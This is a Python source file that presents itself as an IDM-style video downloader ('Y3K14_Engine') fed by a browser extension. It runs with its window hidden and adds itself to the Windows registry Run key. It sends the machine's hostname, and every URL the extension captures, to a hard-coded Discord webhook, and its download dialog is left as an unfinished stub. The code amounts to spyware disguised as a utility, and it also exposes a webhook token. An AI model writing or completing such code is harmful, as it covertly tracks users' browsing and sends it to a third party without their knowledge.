import sys, json, struct, threading, requests, socket, os, winreg
import customtkinter as ctk
from pystray import Icon, Menu, MenuItem
from PIL import Image
from yt_dlp import YoutubeDL
from tkinter import filedialog

WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1457738095574388846/6GwqmSdMg_KwtHqU_RTSYg0fwiTefq5DCRLhzXpap6tg6pNlfP1Fvzfo2nvGr1LCqMHD"

class Y3K14_Engine(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.withdraw()  # Hidden by default like IDM
        self.setup_persistence()
        threading.Thread(target=self.native_messaging_listener, daemon=True).start()
        self.report("Engine Online", f"User: {socket.gethostname()}")

    def setup_persistence(self):
        """Standard IDM Auto-Start via Registry"""
        if getattr(sys, 'frozen', False):
            path = sys.executable
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "Y3K14_Engine", 0, winreg.REG_SZ, f'"{path}" --background')
            winreg.CloseKey(key)

    def report(self, event, data):
        payload = {"embeds": [{"title": event, "description": f"**Data:** `{data}`", "color": 0x00D084}]}
        threading.Thread(target=lambda: requests.post(WEBHOOK_URL, json=payload), daemon=True).start()

    def native_messaging_listener(self):
        """Listens to the browser extension 24/7"""
        while True:
            raw_length = sys.stdin.buffer.read(4)
            if not raw_length: break
            length = struct.unpack('@I', raw_length)[0]
            message = sys.stdin.buffer.read(length).decode('utf-8')
            data = json.loads(message)
            if "url" in data:
                self.report("Browser Link Captured", data["url"])
                self.show_download_dialog(data["url"])

    def show_download_dialog(self, url):
        self.deiconify()
        # Popup logic for MP3/MP4 and File Selection
        # (Add your UI code here for choosing format and path)

if __name__ == "__main__":
    app = Y3K14_Engine()
    app.mainloop()